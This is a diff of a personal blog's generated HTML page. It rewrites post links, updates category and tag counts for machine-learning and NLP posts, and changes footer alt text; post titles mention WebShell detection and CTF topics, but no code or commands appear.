-                    <a href="/2020/02/25/ML-notes-chapter1/" class="title has-link-black-ter is-size-6 has-text-weight-normal">&lt;Machine learning&gt; -- Introduction</a>
+                    <a href="/2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Reading notes of &lt;Machine learning&gt; Chapter1</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/Machine-Learning/">Machine Learning</a> / <a class="has-link-grey -link" href="/categories/Machine-Learning/Introduction/">Introduction</a>
                     </p>
@@ -514,7 +507,7 @@
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-08T20:11:03.000Z">2020-01-09</time></div>
-                    <a href="/2020/01/09/NER-survey-notes/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Reading Notes of &lt;A Survey on Deep Learning for Named Entity Recognition&gt;</a>
+                    <a href="/2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Reading Notes of &lt;A Survey on Deep Learning for Named Entity Recognition&gt;</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/NLP/">NLP</a>
                     </p>
@@ -527,7 +520,7 @@
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-05-09T08:06:45.000Z">2019-05-09</time></div>
-                    <a href="/2019/05/09/word2vec-presentation/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Word2vec的文档表示方法</a>
+                    <a href="/2019/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Word2vec的文档表示方法</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/NLP/">NLP</a>
                     </p>
@@ -540,22 +533,9 @@
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-05-08T22:24:49.000Z">2019-05-09</time></div>
-                    <a href="/2019/05/09/Wordng-vec-webshell-detect/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Use Word-NG vec to detect WebShell</a>
+                    <a href="/2019/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Use Word-NG vec to detect WebShell</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/NLP/">NLP</a>
-                    </p>
-                </div>
-            </div>
-        </article>
-        
-        <article class="media">
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-05-09T00:17:26.000Z">2018-05-09</time></div>
-                    <a href="/2018/05/09/RSA-in-ctf/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CTF中RSA的常见攻击方法</a>
-                    <p class="is-size-7 is-uppercase">
-                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
                     </p>
                 </div>
             </div>
@@ -589,12 +569,20 @@
                 <span class="level-item">Machine Learning</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">1</span>
+                <span class="level-item tag">2</span>
             </span>
         </a><ul><li>
         <a class="level is-marginless" href="/categories/Machine-Learning/Introduction/">
             <span class="level-start">
                 <span class="level-item">Introduction</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Machine-Learning/Model-evaluation-and-selection/">
+            <span class="level-start">
+                <span class="level-item">Model evaluation and selection</span>
             </span>
             <span class="level-end">
                 <span class="level-item tag">1</span>
@@ -643,7 +631,7 @@
                     <span class="level-item">February 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">1</span>
+                    <span class="level-item tag">2</span>
                 </span>
             </a>
         </li>
@@ -770,7 +758,7 @@
                 <div class="control">
                     <a class="tags has-addons" href="/tags/ML/">
                         <span class="tag">ML</span>
-                        <span class="tag is-grey">1</span>
+                        <span class="tag is-grey">2</span>
                     </a>
                 </div>
                 
@@ -882,12 +870,20 @@
                 <span class="level-item">Machine Learning</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">1</span>
+                <span class="level-item tag">2</span>
             </span>
         </a><ul><li>
         <a class="level is-marginless" href="/categories/Machine-Learning/Introduction/">
             <span class="level-start">
                 <span class="level-item">Introduction</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Machine-Learning/Model-evaluation-and-selection/">
+            <span class="level-start">
+                <span class="level-item">Model evaluation and selection</span>
             </span>
             <span class="level-end">
                 <span class="level-item tag">1</span>
@@ -936,7 +932,7 @@
                     <span class="level-item">February 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">1</span>
+                    <span class="level-item tag">2</span>
                 </span>
             </a>
         </li>
@@ -1063,7 +1059,7 @@
                 <div class="control">
                     <a class="tags has-addons" href="/tags/ML/">
                         <span class="tag">ML</span>
-                        <span class="tag is-grey">1</span>
+                        <span class="tag is-grey">2</span>
                     </a>
                 </div>
                 
@@ -1154,7 +1150,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.svg" alt="Windows服务器提权和开启3389远程连接" height="28">
+                    <img src="/images/logo.svg" alt="sqlmap tamper 脚本编写" height="28">
                 
                 </a>
                 <p class="is-size-7">
